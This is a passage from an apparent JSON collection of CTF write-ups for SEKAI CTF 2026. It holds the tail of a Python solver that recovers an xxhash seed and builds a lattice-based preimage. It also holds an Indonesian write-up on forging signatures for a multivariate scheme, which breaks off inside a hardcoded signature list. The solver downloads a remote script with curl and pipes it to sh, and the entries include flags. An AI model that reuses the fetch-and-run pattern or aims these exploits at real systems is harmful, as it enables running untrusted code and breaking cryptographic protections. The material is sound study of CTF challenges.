^ pair[1]) & 1]\r\n    for pair in safe_low_filters:\r\n        if len(candidates) <= 2:\r\n            break\r\n        rv = relation_low_vec(candidates, *pair)\r\n        vals, counts = np.unique(rv, return_counts=True)\r\n        if len(vals) <= 1:\r\n            continue\r\n        relation = find_unknown_low_relation(oracle, vals, counts, pair)\r\n        candidates = candidates[rv == np.uint32(relation)]\r\n        if verbose:\r\n            print(f\"[+] low filter {pair}: remain={len(candidates)}; queries={oracle.queries}\", flush=True)\r\n    return candidates\r\n\r\n\r\ndef high_pair_pool(low_candidates: np.ndarray, verbose: bool = True, limit: int = 6):\r\n    coarse = []\r\n    for i, j, length in OPPOSITE_PAIRS:\r\n        if common_zero_bit(low_candidates, (i, j)) is None:\r\n            continue\r\n        qs = sorted(set(qhigh_pair(int(x), i, j) for x in low_candidates))\r\n        coarse.append((count_relation_union(qs), length, (i, j)))\r\n\r\n    pool = []\r\n    for _, length, pair in sorted(coarse)[:limit]:\r\n        vals, weights = initial_high_distribution(low_candidates, *pair)\r\n        expected = expected_guesswork(weights)\r\n        pool.append({\r\n            \"pair\": pair,\r\n            \"length\": length,\r\n            \"vals\": vals,\r\n            \"weights\": weights,\r\n            \"expected\": expected,\r\n        })\r\n        if verbose:\r\n            print(\r\n                f\"[*] high pool {pair}: relations={len(vals)}, \"\r\n                f\"expected-tests={expected:.1f}, max-preimages={int(weights.max())}\",\r\n                flush=True,\r\n            )\r\n    pool.sort(key=lambda x: (x[\"expected\"], x[\"length\"]))\r\n    return pool\r\n\r\n\r\ndef choose_filter_pair(seed_lows: np.ndarray, seed_highs: np.ndarray):\r\n    count = len(seed_highs)\r\n    unique_lows = np.unique(seed_lows)\r\n    best = None\r\n    for i, j, length in ALL_PAIRS:\r\n        bit = common_zero_bit(unique_lows, (i, j))\r\n        if bit is None:\r\n            continue\r\n        rv = relation_high_vec(seed_lows, seed_highs, i, j)\r\n        vals, weights = np.unique(rv, return_counts=True)\r\n        if len(vals) <= 1:\r\n            continue\r\n        probabilities = weights.astype(np.float64) / count\r\n        entropy = float(-np.sum(probabilities * np.log2(probabilities)))\r\n        if entropy <= 0:\r\n            continue\r\n        expected = expected_guesswork(weights)\r\n        expected_remaining = float(np.dot(weights.astype(np.float64), weights.astype(np.float64)) / count)\r\n        key = (expected * length / entropy, expected_remaining, expected * length)\r\n        if best is None or key < best[0]:\r\n            best = (key, (i, j), bit, rv, vals, weights)\r\n    if best is None:\r\n        raise RuntimeError(\"no useful high-half filter\")\r\n    return best\r\n\r\n\r\ndef recover_seed(oracle, verbose: bool = True) -> int:\r\n    low_candidates = recover_low_half(oracle, verbose)\r\n    pool = high_pair_pool(low_candidates, verbose)\r\n\r\n    relations: list[tuple[tuple[int, int], int, int]] = []\r\n    for entry in pool:\r\n        pair = entry[\"pair\"]\r\n        bit = common_zero_bit(low_candidates, pair)\r\n        assert bit is not None\r\n        relation = find_known_high_relation(\r\n            oracle, entry[\"vals\"], entry[\"weights\"], pair, bit\r\n        )\r\n        pos = np.where(entry[\"vals\"] == np.uint32(relation))[0]\r\n        preimages = int(entry[\"weights\"][pos[0]]) if len(pos) else (1 << 32)\r\n        relations.append((pair, relation, preimages))\r\n        if verbose:\r\n            print(\r\n                f\"[+] high relation {pair}: {relation:#010x}; \"\r\n                f\"preimages={preimages}; queries={oracle.queries}\",\r\n                flush=True,\r\n            )\r\n        if len(relations) >= 2 and min(x[2] for x in relations) <= 1_000_000:\r\n            break\r\n        if len(relations) >= 3:\r\n            break\r\n\r\n    base = min(relations, key=lambda x: x[2])\r\n    other_relations = [item for item in relations if item is not base]\r\n    low_parts: list[np.ndarray] = []\r\n    high_parts: list[np.ndarray] = []\r\n\r\n    for low_np in low_candidates:\r\n        low = int(low_np)\r\n        highs = high_candidates_from_relation(low, *base[0], base[1])\r\n        if len(highs) == 0:\r\n            continue\r\n        lows = np.full(len(highs), np.uint32(low), dtype=np.uint32)\r\n        for pair, relation, _ in other_relations:\r\n            keep = relation_high_vec(lows, highs, *pair) == np.uint32(relation)\r\n            lows = lows[keep]\r\n            highs = highs[keep]\r\n            if len(highs) == 0:\r\n                break\r\n        if len(highs):\r\n            low_parts.append(lows)\r\n            high_parts.append(highs)\r\n\r\n    if not high_parts:\r\n        raise RuntimeError(\"all high-half candidates were eliminated\")\r\n    seed_lows = np.concatenate(low_parts)\r\n    seed_highs = np.concatenate(high_parts)\r\n    if verbose:\r\n        print(f\"[+] intersected seed candidates: {len(seed_highs)}\", flush=True)\r\n\r\n    rounds = 0\r\n    for pair in LOW_FILTERS:\r\n        if len(seed_highs) <= 200_000:\r\n            break\r\n        bit = common_zero_bit(np.unique(seed_lows), pair)\r\n        if bit is None:\r\n            continue\r\n        rv = relation_high_vec(seed_lows, seed_highs, *pair)\r\n        vals, counts = np.unique(rv, return_counts=True)\r\n        if len(vals) <= 1:\r\n            continue\r\n        relation = find_known_high_relation(oracle, vals, counts, pair, bit)\r\n        keep = rv == np.uint32(relation)\r\n        seed_lows = seed_lows[keep]\r\n        seed_highs = seed_highs[keep]\r\n        rounds += 1\r\n        if verbose:\r\n            print(f\"[+] high fixed filter {pair}: remain={len(seed_highs)}; queries={oracle.queries}\", flush=True)\r\n\r\n    while len(seed_highs) > 8 and rounds < 16:\r\n        _, pair, bit, rv, vals, counts = choose_filter_pair(seed_lows, seed_highs)\r\n        relation = find_known_high_relation(oracle, vals, counts, pair, bit)\r\n        keep = rv == np.uint32(relation)\r\n        seed_lows = seed_lows[keep]\r\n        seed_highs = seed_highs[keep]\r\n        rounds += 1\r\n        if verbose:\r\n            print(f\"[+] high filter {pair}: remain={len(seed_highs)}; queries={oracle.queries}\", flush=True)\r\n\r\n    probe = bytes(320)\r\n    expected = oracle.hash_one(probe)\r\n    seeds = []\r\n    for low_np, high_np in zip(seed_lows, seed_highs):\r\n        seed = (int(high_np) << 32) | int(low_np)\r\n        if xxh_hex(probe, seed) == expected:\r\n            seeds.append(seed)\r\n    if len(seeds) != 1:\r\n        raise RuntimeError(f\"seed validation produced {len(seeds)} candidates\")\r\n    return seeds[0]\r\n\r\n\r\n# ---------------------------------------------------------------------------\r\n# Invert one fold128(c, y) with a small lattice\r\n# ---------------------------------------------------------------------------\r\n\r\n\r\ndef invert_fold_once(\r\n    c: int,\r\n    target: int,\r\n    rng: random.Random,\r\n    block: int,\r\n    scale: int,\r\n    marker: int,\r\n    loops: int,\r\n) -> int | None:\r\n    if c == 0:\r\n        return 0 if target == 0 else None\r\n\r\n    n = 64\r\n    dim = 66\r\n    raw = [\r\n        ((1 << j) * ((1 << 64) + 1 - 2 * ((target >> j) & 1))) % c\r\n        for j in range(n)\r\n    ]\r\n    permutation = list(range(n))\r\n    rng.shuffle(permutation)\r\n\r\n    basis = IntegerMatrix(dim, dim)\r\n    for row, bit in enumerate(permutation):\r\n        basis[row, row] = 2\r\n        lift = rng.randint(-3, 3)\r\n        basis[row, 65] = scale * (raw[bit] + lift * c)\r\n    for row in range(n):\r\n        basis[64, row] = 1\r\n    basis[64, 64] = marker\r\n    basis[64, 65] = scale * ((-target) % c + rng.randint(-3, 3) * c)\r\n    basis[65, 65] = scale * c\r\n\r\n    LLL.reduction(basis, delta=0.999, eta=0.501)\r\n    BKZ.reduction(\r\n        basis,\r\n        BKZ.Param(block_size=block, max_loops=loops, flags=BKZ.AUTO_ABORT),\r\n    )\r\n\r\n    for row_idx in range(dim):\r\n        row = [int(basis[row_idx, col]) for col in range(dim)]\r\n        for sign in (1, -1):\r\n            v = [sign * x for x in row]\r\n            if abs(v[64]) != marker or v[65] != 0:\r\n                continue\r\n            if not all(abs(v[i]) == 1 for i in range(64)):\r\n                continue\r\n            if v[64] == -marker:\r\n                bits = [(v[i] + 1) // 2 for i in range(64)]\r\n            else:\r\n                bits = [(-v[i] + 1) // 2 for i in range(64)]\r\n            high_product = 0\r\n            for perm_idx, bit_value in enumerate(bits):\r\n                high_product |= bit_value << permutation[perm_idx]\r\n            numerator = high_product * (1 << 64) + (target ^ high_product)\r\n            if numerator % c:\r\n                continue\r\n            y = numerator // c\r\n            if y < (1 << 64) and fold128(c, y) == target:\r\n                return y\r\n    return None\r\n\r\n\r\ndef invert_fold(c: int, target: int, rng: random.Random, attempts: int = 12) -> int | None:\r\n    for attempt in range(attempts):\r\n        result = invert_fold_once(\r\n            c,\r\n            target,\r\n            rng,\r\n            block=20 + 2 * (attempt % 5),\r\n            scale=1 << (8 + 2 * (attempt % 5)),\r\n            marker=(1, 2, 4)[attempt % 3],\r\n            loops=4 + (attempt % 3),\r\n        )\r\n        if result is not None:\r\n            return result\r\n    return None\r\n\r\n\r\ndef solve_pair_sum(c0: int, c1: int, target: int, rng: random.Random) -> tuple[int, int]:\r\n    for _ in range(50):\r\n        y0 = rng.getrandbits(64)\r\n        remaining = (target - fold128(c0, y0)) & MASK64\r\n        y1 = invert_fold(c1, remaining, rng, attempts=5)\r\n        if y1 is not None:\r\n            assert (fold128(c0, y0) + fold128(c1, y1)) & MASK64 == target\r\n            return y0, y1\r\n    raise RuntimeError(\"failed to invert fold128 pair sum\")\r\n\r\n\r\ndef target_accumulators(seed: int, rng: random.Random) -> list[int]:\r\n    secret = custom_secret(seed)\r\n    target_high = int.from_bytes(TARGET[:8], \"big\")\r\n    target_low = int.from_bytes(TARGET[8:], \"big\")\r\n    pre_low = inverse_avalanche(target_low)\r\n    pre_high = inverse_avalanche(target_high)\r\n    need_low = (pre_low - 320 * P64_1) & MASK64\r\n    need_high = (pre_high - ((~(320 * P64_2)) & MASK64)) & MASK64\r\n\r\n    low_keys = [\r\n        (u64(secret, 11 + 16*i), u64(secret, 19 + 16*i))\r\n        for i in range(4)\r\n    ]\r\n    high_keys = [\r\n        (u64(secret, 117 + 16*i), u64(secret, 125 + 16*i))\r\n        for i in range(4)\r\n    ]\r\n\r\n    acc = [0] * 8\r\n    c0 = high_keys[0][0] ^ low_keys[0][0]\r\n    c1 = high_keys[1][0] ^ low_keys[1][0]\r\n    y0, y1 = solve_pair_sum(c0, c1, need_low, rng)\r\n    for pair_index, y in ((0, y0), (1, y1)):\r\n        acc[2*pair_index] = high_keys[pair_index][0]\r\n        acc[2*pair_index+1] = low_keys[pair_index][1] ^ y\r\n\r\n    c2 = low_keys[2][0] ^ high_keys[2][0]\r\n    c3 = low_keys[3][0] ^ high_keys[3][0]\r\n    y2, y3 = solve_pair_sum(c2, c3, need_high, rng)\r\n    for pair_index, y in ((2, y2), (3, y3)):\r\n        acc[2*pair_index] = low_keys[pair_index][0]\r\n        acc[2*pair_index+1] = high_keys[pair_index][1] ^ y\r\n\r\n    # Exact merge verification.\r\n    low = (320 * P64_1) & MASK64\r\n    high = (~(320 * P64_2)) & MASK64\r\n    for i in range(4):\r\n        low = (low + fold128(acc[2*i] ^ low_keys[i][0], acc[2*i+1] ^ low_keys[i][1])) & MASK64\r\n        high = (high + fold128(acc[2*i] ^ high_keys[i][0], acc[2*i+1] ^ high_keys[i][1])) & MASK64\r\n    if low != pre_low or high != pre_high:\r\n        raise RuntimeError(\"target accumulator merge verification failed\")\r\n    return acc\r\n\r\n\r\ndef build_payload(seed: int, desired_acc: list[int]) -> bytes:\r\n    secret = custom_secret(seed)\r\n    fixed = INIT_ACC.copy()\r\n    # Stripes 2, 3 and the mandatory final stripe remain zero.\r\n    for secret_offset in (16, 24, 121):\r\n        for lane in range(8):\r\n            key = u64(secret, secret_offset + 8*lane)\r\n            fixed[lane] = (fixed[lane] + (key & MASK32) * (key >> 32)) & MASK64\r\n\r\n    data = bytearray(320)\r\n    for source_lane in range(8):\r\n        target_lane = source_lane ^ 1\r\n        needed_sum = (desired_acc[target_lane] - fixed[target_lane]) & MASK64\r\n        key0 = u64(secret, 8*source_lane)\r\n        key1 = u64(secret, 8 + 8*source_lane)\r\n        key0_low = key0 & MASK32\r\n        key1_high = key1 >> 32\r\n\r\n        low1 = ((needed_sum & MASK32) - key0_low) & MASK32\r\n        carry = (key0_low + low1) >> 32\r\n        high0 = ((needed_sum >> 32) - key1_high - carry) & MASK32\r\n        word0 = (high0 << 32) | key0_low\r\n        word1 = (key1_high << 32) | low1\r\n\r\n        # The product contribution in stripe 0/1 is zero by construction.\r\n        assert ((word0 ^ key0) & MASK32) == 0\r\n        assert ((word1 ^ key1) >> 32) == 0\r\n        data[8*source_lane:8*source_lane+8] = word0.to_bytes(8, \"little\")\r\n        data[64+8*source_lane:64+8*source_lane+8] = word1.to_bytes(8, \"little\")\r\n\r\n    _, _, actual_acc = model_hash_320(bytes(data), seed)\r\n    if actual_acc != desired_acc:\r\n        raise RuntimeError(\"payload accumulator verification failed\")\r\n    if xxh_digest(bytes(data), seed) != TARGET:\r\n        raise RuntimeError(\"payload digest verification failed\")\r\n    return bytes(data)\r\n\r\n\r\n# ---------------------------------------------------------------------------\r\n# Remote protocol\r\n# ---------------------------------------------------------------------------\r\n\r\n\r\nclass RemoteOracle:\r\n    POW_URL = \"https://pwn.red/pow\"\r\n\r\n    def __init__(self, host: str, port: int):\r\n        self.sock = socket.create_connection((host, port), timeout=15)\r\n        self.sock.settimeout(120)\r\n        self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)\r\n        if hasattr(socket, \"TCP_QUICKACK\"):\r\n            try:\r\n                self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_QUICKACK, 1)\r\n            except OSError:\r\n                pass\r\n        self.buffer = b\"\"\r\n        self.queries = 0\r\n        self._solve_pow()\r\n\r\n    def _recv_until(self, marker: bytes) -> bytes:\r\n        \"\"\"Receive through marker while preserving bytes that follow it.\"\"\"\r\n        while True:\r\n            pos = self.buffer.find(marker)\r\n            if pos >= 0:\r\n                end = pos + len(marker)\r\n                data = self.buffer[:end]\r\n                self.buffer = self.buffer[end:]\r\n                return data\r\n\r\n            chunk = self.sock.recv(65536)\r\n            self._quick_ack()\r\n            if not chunk:\r\n                raise EOFError(\r\n                    \"remote closed the connection during the PoW handshake: \"\r\n                    + self.buffer.decode(errors=\"replace\")\r\n                )\r\n            self.buffer += chunk\r\n\r\n    def _solve_pow(self) -> None:\r\n        \"\"\"Solve the pwn.red proof-of-work challenge announced by the server.\"\"\"\r\n        banner = self._recv_until(b\"solution:\")\r\n        text = banner.decode(errors=\"replace\")\r\n        print(text, end=\"\", flush=True)\r\n\r\n        match = re.search(\r\n            r\"curl\\s+-sSfL\\s+https://pwn\\.red/pow\\s*\\|\\s*sh\\s+-s\\s+(\\S+)\",\r\n            text,\r\n        )\r\n        if match is None:\r\n            raise RuntimeError(f\"unsupported PoW banner:\\n{text}\")\r\n\r\n        challenge = match.group(1)\r\n        print(f\"[*] Solving proof of work for challenge {challenge}\", flush=True)\r\n\r\n        try:\r\n            downloader = subprocess.run(\r\n                [\"curl\", \"-sSfL\", self.POW_URL],\r\n                check=True,\r\n                stdout=subprocess.PIPE,\r\n                stderr=subprocess.PIPE,\r\n                timeout=30,\r\n            )\r\n            solver = subprocess.run(\r\n                [\"sh\", \"-s\", challenge],\r\n                input=downloader.stdout,\r\n                check=True,\r\n                stdout=subprocess.PIPE,\r\n                stderr=subprocess.PIPE,\r\n                timeout=300,\r\n            )\r\n        except FileNotFoundError as exc:\r\n            raise RuntimeError(\"curl or sh is not installed\") from exc\r\n        except subprocess.TimeoutExpired as exc:\r\n            raise RuntimeError(\"proof-of-work solver timed out\") from exc\r\n        except subprocess.CalledProcessError as exc:\r\n            stderr = exc.stderr.decode(errors=\"replace\") if exc.stderr else \"\"\r\n            raise RuntimeError(f\"proof-of-work solver failed: {stderr}\") from exc\r\n\r\n        lines = [line.strip() for line in solver.stdout.splitlines() if line.strip()]\r\n        if not lines:\r\n            stderr = solver.stderr.decode(errors=\"replace\")\r\n            raise RuntimeError(f\"proof-of-work solver returned no solution: {stderr}\")\r\n\r\n        solution = lines[-1]\r\n        print(f\"[+] PoW solution: {solution.decode(errors='replace')}\", flush=True)\r\n        self.sock.sendall(solution + b\"\\n\")\r\n\r\n    def _quick_ack(self) -> None:\r\n        if hasattr(socket, \"TCP_QUICKACK\"):\r\n            try:\r\n                self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_QUICKACK, 1)\r\n            except OSError:\r\n                pass\r\n\r\n    def _receive_hashes(self, count: int) -> list[str]:\r\n        marker = b\"[+] Hash: \"\r\n        found: list[str] = []\r\n        while len(found) < count:\r\n            while True:\r\n                pos = self.buffer.find(marker)\r\n                if pos < 0 or len(self.buffer) < pos + len(marker) + 32:\r\n                    break\r\n                value = self.buffer[pos + len(marker):pos + len(marker) + 32]\r\n                if all(c in b\"0123456789abcdef\" for c in value):\r\n                    found.append(value.decode())\r\n                    self.buffer = self.buffer[pos + len(marker) + 32:]\r\n                    if len(found) == count:\r\n                        return found\r\n                else:\r\n                    self.buffer = self.buffer[pos + 1:]\r\n            chunk = self.sock.recv(1 << 20)\r\n            self._quick_ack()\r\n            if not chunk:\r\n                raise EOFError(\"remote closed the connection\")\r\n            self.buffer += chunk\r\n        return found\r\n\r\n    def hash_many(self, payloads: list[bytes]) -> list[str]:\r\n        if not payloads:\r\n            return []\r\n        request = bytearray()\r\n        for payload in payloads:\r\n            request += b\"1\\n\" + payload.hex().encode() + b\"\\n\"\r\n\r\n        send_errors: list[BaseException] = []\r\n\r\n        def sender() -> None:\r\n            try:\r\n                self.sock.sendall(request)\r\n            except BaseException as exc:  # propagated after receive unblocks\r\n                send_errors.append(exc)\r\n\r\n        thread = threading.Thread(target=sender, daemon=True)\r\n        thread.start()\r\n        result = self._receive_hashes(len(payloads))\r\n        thread.join()\r\n        if send_errors:\r\n            raise send_errors[0]\r\n        self.queries += len(payloads)\r\n        return result\r\n\r\n    def hash_one(self, payload: bytes) -> str:\r\n        return self.hash_many([payload])[0]\r\n\r\n    def submit(self, payload: bytes) -> str:\r\n        self.sock.sendall(b\"2\\n\" + payload.hex().encode() + b\"\\n\")\r\n        data = self.buffer\r\n        self.buffer = b\"\"\r\n        self.sock.settimeout(20)\r\n        while True:\r\n            match = re.search(rb\"SEKAI\\{[^\\r\\n}]*\\}\", data)\r\n            if match:\r\n                return match.group().decode()\r\n            try:\r\n                chunk = self.sock.recv(65536)\r\n            except socket.timeout as exc:\r\n                raise RuntimeError(data.decode(errors=\"replace\")) from exc\r\n            if not chunk:\r\n                raise RuntimeError(data.decode(errors=\"replace\"))\r\n            data += chunk\r\n\r\n\r\nclass LocalOracle:\r\n    def __init__(self, seed: int):\r\n        self.seed = seed\r\n        self.queries = 0\r\n\r\n    def hash_many(self, payloads: list[bytes]) -> list[str]:\r\n        self.queries += len(payloads)\r\n        return [xxh_hex(payload, self.seed) for payload in payloads]\r\n\r\n    def hash_one(self, payload: bytes) -> str:\r\n        return self.hash_many([payload])[0]\r\n\r\n\r\n# ---------------------------------------------------------------------------\r\n# Entry point\r\n# ---------------------------------------------------------------------------\r\n\r\n\r\ndef main() -> None:\r\n    parser = argparse.ArgumentParser()\r\n    parser.add_argument(\"host\", nargs=\"?\", default=\"iihash.chals.sekai.team\")\r\n    parser.add_argument(\"port\", nargs=\"?\", type=int, default=1337)\r\n    parser.add_argument(\"--local-seed\", type=lambda x: int(x, 0), help=\"run a local end-to-end self-test\")\r\n    args = parser.parse_args()\r\n\r\n    started = time.time()\r\n    if args.local_seed is not None:\r\n        oracle = LocalOracle(args.local_seed & MASK64)\r\n    else:\r\n        print(f\"[*] Connecting to {args.host}:{args.port}\", flush=True)\r\n        oracle = RemoteOracle(args.host, args.port)\r\n\r\n    seed = recover_seed(oracle, verbose=True)\r\n    print(f\"[+] Recovered seed: {seed:#018x}\", flush=True)\r\n\r\n    rng = random.Random(seed)\r\n    desired_acc = target_accumulators(seed, rng)\r\n    payload = build_payload(seed, desired_acc)\r\n    print(f\"[+] Preimage ready: {len(payload)} bytes\", flush=True)\r\n    print(f\"[+] Local digest: {xxh_digest(payload, seed)!r}\", flush=True)\r\n\r\n    if args.local_seed is not None:\r\n        assert seed == (args.local_seed & MASK64)\r\n        print(f\"[+] Self-test passed in {time.time() - started:.2f}s with {oracle.queries} queries\")\r\n        return\r\n\r\n    flag = oracle.submit(payload)\r\n    print(f\"<FLAG>{flag}</FLAG>\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "SEKAI{Im4g1n3_U5iNg_LLL_!n_d1ff3rEn7IAL_Cryp7aN@lySis}",
    "lessonsLearned": ""
  },
  {
    "id": "projectsekai2026-crypto-needleinamultivariatesekai-cryptoneedle-in-a-multivariate-sekai",
    "title": "needLe in a multivariate sekai",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "ProjectSekai 2026",
    "tags": [],
    "description": "**Category:** Crypto  \n**CTF:** SEKAI CTF 2026  \n**Difficulty:** Hard  \n**Flag:** `SEKAI{y0U_f0uND_th3_n33dL3!!!_https://youtu.be/Sloi-L5FHBY}`",
    "problemDescription": "Public key merupakan quadratic form 144 dimensi yang disamarkan dengan transformasi unimodular. Challenge juga memberikan 200 signature untuk pesan yang diketahui.\n\nSignature tersebut bukan sekadar contoh. Setelah setiap sampel dinormalisasi dengan parameter Gaussian-nya, baris transformasi rahasia menjadi vektor-vektor pendek pada lattice transcript. LLL/BKZ dan `g6k` cukup untuk memulihkan transformasi unimodular, membuka kembali bentuk block matrix, lalu membuat signature valid untuk pesan `STAGE OF SEKAI`.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "File yang diberikan",
        "content": "`gen.py` membuat key pair dan membocorkan 200 signature:\n\n\n\nServer meminta satu signature untuk pesan tetap:\n\n\n\nJadi targetnya adalah existential forgery untuk public key yang sama.",
        "code": "gen.py\nserver.py\nsig.py\nutils.py\npk.sobj\noutput.txt"
      },
      {
        "title": "Struktur skema",
        "content": "Parameter default:\n\n\n\nSebelum disamarkan, public quadratic form memiliki bentuk:\n\n\n\n`p` dan `q` adalah prime sekitar 80 bit. Matriks `M2` juga sengaja memiliki empat baris nol:\n\n\n\nKeygen lalu membuat matriks unimodular `U` dari 40 lapisan permutasi dan row shear kecil:\n\n\n\nSigner membentuk vektor tersembunyi `x`, kemudian mengeluarkan:\n\n\n\nKarena itu:\n\n\n\nUntuk pesan `msg`, nilai targetnya adalah:",
        "code": "m = 128\nk = 8\nn = m + 2k = 144\nB1 = 2^80\nB0 = 2^40"
      },
      {
        "title": "Kebocoran dari 200 signature",
        "content": "Misalkan setiap signature publik adalah kolom `s_i`. Dari proses signing:\n\n\n\nmaka:\n\n\n\nBuat matriks transcript `S` berukuran `144 x 200`, dengan signature sebagai kolom. Untuk setiap baris rahasia `u_j` dari `U`:\n\n\n\nKoordinat tersembunyi `x_i[j]` diambil dari distribusi Gaussian dengan skala yang bisa dihitung dari pesan:\n\n\n\nPesan-pesan pada transcript diketahui, yaitu `message 0` sampai `message 199`. Semua `t_i` dan `u_i` dapat dihitung ulang.\n\nSaya menormalisasi setiap kolom transcript:\n\n\n\nSetelah normalisasi, baris `U` menghasilkan 200 sampel berukuran hampir seragam. `U` sendiri juga relatif kecil karena hanya dibuat dari permutasi dan shear dengan koefisien `-2..2`.\n\nGunakan embedding:\n\n\n\nUntuk kombinasi integer `a`:\n\n\n\nJika `a` adalah sebuah baris `U`, bagian `aR` menjadi satu koordinat tersembunyi dari 200 signature. Vektor tersebut jauh lebih pendek dibanding kombinasi acak. Blok identitas mencegah reducer memilih relasi transcript dengan koefisien sangat besar.",
        "code": "s_i = U^-1 x_i"
      },
      {
        "title": "Memulihkan transformasi unimodular",
        "content": "Reduksi dilakukan bertahap:\n\n1. LLL pada embedding transcript untuk mendapat basis awal.\n2. Bentuk Gram lokal `H = Y Y^T`, dengan `Y = T R` dan `T` sebagai transformasi yang sedang dilacak.\n3. Jalankan beberapa pass BKZ block size 20 sampai 35 pada Gram matrix tersebut.\n4. Bangun ulang embedding `[T R | I]`.\n5. Jalankan `g6k` pump/sieving beberapa kali.\n\nPotongan inti embedding:\n\n\n\nSesudah BKZ lokal, `g6k` dijalankan pada embedding yang sudah terkondisi:\n\n\n\nPump diulang dengan seed berbeda. Pada hasil akhir, seluruh 144 vektor memiliki norm transcript sekitar 56–57 bit. Right block embedding memberi transformasi tambahan `R_g6k`, sehingga kandidat transformasi penuh adalah:\n\n\n\nKandidat yang benar memiliki determinant `-1`, sehingga tetap unimodular.",
        "code": "N = 144\nK = 200\nL = 24\n\nraw = []\nfor j in range(N):\n    row = []\n    for i in range(K):\n        row.append(round((signatures[i][j] << L) / gaussian_scales[i]))\n    raw.append(row)\n\nbasis = [\n    raw[i] + [1 if i == j else 0 for j in range(N)]\n    for i in range(N)\n]"
      },
      {
        "title": "Validasi recovery",
        "content": "Public matrix asli dipulihkan dengan:\n\n\n\nHasilnya menunjukkan struktur yang tidak mungkin muncul secara kebetulan:\n\n\n\nKedua nilai tersebut muncul tepat delapan kali pada diagonal. Selain itu ditemukan:\n\n- dua kelompok diagonal berukuran delapan untuk block `p I_8` dan `q I_8`;\n- tepat empat koordinat `x1` yang tidak memiliki coupling ke block `q`, sesuai `M2[:4, :] = 0`;\n- 152 entri off-diagonal nol yang mengembalikan struktur block matrix;\n- `det(U_recovered) = -1`.\n\nIni cukup untuk memastikan transformasi yang dipulihkan memang trapdoor asli, walaupun urutan dan tanda koordinat dapat berbeda.",
        "code": "A = U_recovered^-T * M_public * U_recovered^-1"
      },
      {
        "title": "Menyusun ulang trapdoor",
        "content": "Dua prime dikenali dari nilai diagonal yang masing-masing berulang delapan kali. Block `q` dibedakan dari block `p` dengan mencari kelompok yang memiliki tepat empat baris `x1` tanpa coupling:\n\n\n\nSetelah koordinat diurutkan kembali menjadi:\n\n\n\nmatriks `M1`, `M2`, dan `M0` dapat diambil langsung dari block `A`.",
        "code": "def zero_rows(group):\n    return [\n        i for i in x_indices\n        if all(A[i, j] == 0 for j in group)\n    ]"
      },
      {
        "title": "Membuat signature target",
        "content": "Signer asli direplikasi dengan trapdoor hasil recovery."
      },
      {
        "title": "1. Hitung target",
        "content": "",
        "code": "message = b\"STAGE OF SEKAI\"\nt = int.from_bytes(b\"\\x01\" + sha256(message).digest(), \"big\")"
      },
      {
        "title": "2. Sampel `x1`",
        "content": "Ambil 128 bilangan Gaussian. Empat koordinat dikoreksi modulo `q`, lalu empat koordinat lain dikoreksi modulo `p`. Koreksi memakai minor `4 x 4` yang invertible:\n\n\n\nFungsi `closest_congruent` memilih wakil kongruen yang paling dekat dengan sampel Gaussian awal.",
        "code": "x1 * M2[:, q_selected] = 0 mod q\nx1 * M1[:, p_selected] = 0 mod p"
      },
      {
        "title": "3. Hitung residual",
        "content": "Untuk kolom terpilih, pembagian berikut menjadi exact integer:\n\n\n\nKemudian hitung residual target setelah kontribusi `x1` dan offset dikurangi.",
        "code": "c1 = x1 M1\nc2 = x1 M2"
      },
      {
        "title": "4. Pecah residual menjadi `a p + b q`",
        "content": "Pilih `a` yang memenuhi:\n\n\n\nTambahkan kelipatan `q` sampai `a` dan:\n\n\n\nkeduanya non-negatif.",
        "code": "a = t0 * p^-1 mod q"
      },
      {
        "title": "5. Four squares",
        "content": "Representasikan `a` dan `b` sebagai jumlah empat kuadrat:\n\n\n\nEmpat nilai tersebut mengisi koordinat terpilih pada block `p` dan `q`. Vektor canonical menjadi:\n\n\n\nTerakhir, ubah kembali ke koordinat publik:\n\n\n\nSignature hasil forge diverifikasi lokal dengan persamaan exact:",
        "code": "a = a0^2 + a1^2 + a2^2 + a3^2\nb = b0^2 + b1^2 + b2^2 + b3^2"
      },
      {
        "title": "Solver final",
        "content": "Recovery lattice hanya perlu dilakukan satu kali karena public key dan pesan target tidak berubah. `solve.py` menyimpan signature hasil forge, memverifikasinya terhadap `pk.sobj`, lalu mengirim 144 integer ke service.\n\nJalankan:\n\n\n\nUntuk hanya mengecek signature secara lokal:\n\n\n\nJika `pk.sobj` tidak berada di direktori aktif:\n\n\n\nContoh output:",
        "code": "python3 solve.py"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\"\"\"Remote solver for SEKAI CTF - needLe in a multivariate sekai.\r\n\r\nThe embedded signature was forged after recovering the hidden unimodular\r\ntransformation from the 200 leaked signatures.  It is valid for the fixed\r\nserver message b\"STAGE OF SEKAI\" and the public key shipped with the task.\r\n\"\"\"\r\n\r\nfrom __future__ import annotations\r\n\r\nimport argparse\r\nimport pickletools\r\nimport re\r\nimport socket\r\nimport sys\r\nimport zlib\r\nfrom pathlib import Path\r\n\r\nDEFAULT_HOST = \"needle-in-a-multivariate-sekai.chals.sekai.team\"\r\nDEFAULT_PORT = 1337\r\nTARGET_MESSAGE = b\"STAGE OF SEKAI\"\r\n\r\nSIGNATURE = [3450864418631778027468557318417, 212800169523885553147739592737104, -68951959825895518020512111668576, 42121974185135009496560345962581, -7538134299148156791593274169606, 4020158207629781713149051733410, 14363440206734639231736472816731, -85963465722516384004970049747969, 6065885952394558053574226670548, -19807275704346004227736633525592, 11302594894450529192755901596725, 79543690423459381306934575241413, -16363453479819539874165224980582, 989018891260538842052666284748, -982178434590729764583105614691, 2489433177473218693635490691933, -4988131520077205271758014767184, -2619450999798765891374744885278, 20079220732015365337951032790071, -1844914633438402454665661888533, 7346783976233578539545218890036, 9873395976559744890227660533461, 65559987670556954611937760993094, -16459601283239233674904601358833, -7125702562536538902759653340158, 6513699559171197838150494436970, -1788826407492507885764788402905, 20254886889644516172164268380411, -62292242522443869581244303982111, -4325886955014163733734381604179, -6594961085147415361760302634493, 12147886435355212633586972730683, 98160848628433350268155597020469, 6634344357751041138495673930591, 15320969021631609808572731593864, -5280764860956177960446145246800, -3483374518736904447813508023427, 